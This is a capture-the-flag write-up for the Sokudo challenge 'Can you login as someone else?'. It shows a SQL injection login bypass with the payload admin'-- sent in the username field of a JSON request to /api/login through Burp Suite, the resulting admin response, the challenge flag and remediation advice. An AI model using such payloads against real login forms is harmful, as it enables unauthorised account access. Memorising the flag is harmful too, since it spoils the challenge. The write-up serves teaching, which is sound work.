# Sokudo — sokudo-004 — Can you login as someone else?

## Challenge

**Sokudo — Can you login as someone else?**

The objective is to bypass the login authentication and access the application as another user.

---

## Step 1 — Open the Login Page

Open the Sokudo challenge and navigate to the login page.

The application provides a username and password login form.

---

## Step 2 — Capture the Login Request

Open **Burp Suite** and configure the browser to use Burp Proxy.

Enter any test credentials in the login form and submit them.

In Burp Suite, inspect the request sent to:

```http
POST /api/login
```

The request uses JSON data.

Example:

```http
POST /api/login HTTP/2
Content-Type: application/json

{
  "username": "test",
  "password": "test"
}
```

---

## Step 3 — Send the Request to Repeater

Right-click the login request in Burp Suite and select:

**Send to Repeater**

Open the request in the **Repeater** tab so that the parameters can be modified and tested.

---

## Step 4 — Test for SQL Injection

The `username` parameter is potentially vulnerable to SQL injection.

Replace the username with:

```text
admin'--
```

Keep any password, for example:

```json
{
  "username": "admin'--",
  "password": "admin"
}
```

Send the request.

---

## Step 5 — Observe the Response

The server responds with:

```http
HTTP/2 200
Content-Type: application/json
```

The response contains an authentication token and information about the logged-in user.

The important part is:

```json
{
  "user": {
    "id": 1,
    "username": "admin",
    "email": "admin@sokudo.app",
    "full_name": "System Administrator",
    "role": "admin"
  }
}
```

This confirms that the login was successfully bypassed and the application authenticated us as the administrator.

---

## Step 6 — Understand the SQL Injection

The payload used was:

```text
admin'--
```

The single quote can terminate the username string in a vulnerable SQL query.

The `--` begins a SQL comment, causing the remaining part of the query to be ignored.

Conceptually, a vulnerable query could behave like:

```sql
SELECT * FROM users
WHERE username = 'admin'--'
AND password = 'admin';
```

The password condition is therefore commented out.

This allows authentication without knowing the administrator's actual password.

---

## Step 7 — Retrieve the Flag

The successful API response also contains the challenge flag:

```text
bug{KWKPjFE5m5Sd3k5XeVXfixaVZbKFE3pr}
```

Therefore, the challenge is solved.

---

## Vulnerability

**SQL Injection — Authentication Bypass**

### Affected Endpoint

```http
POST /api/login
```

### Vulnerable Parameter

```text
username
```

### Payload

```text
admin'--
```

### Impact

An attacker can manipulate the SQL query used for authentication and bypass the password verification.

In this challenge, the attack results in authentication as:

```text
Username: admin
Role: admin
```

---

## Remediation

The application should:

1. Use **prepared statements / parameterized queries**.
2. Never concatenate user-controlled input directly into SQL queries.
3. Properly validate and sanitize input.
4. Store passwords using secure password hashing.
5. Perform authorization checks on every privileged endpoint.
6. Avoid exposing unnecessary authentication information in API responses.

### Result

**SQL injection → Authentication bypass → Administrator access → Flag obtained**
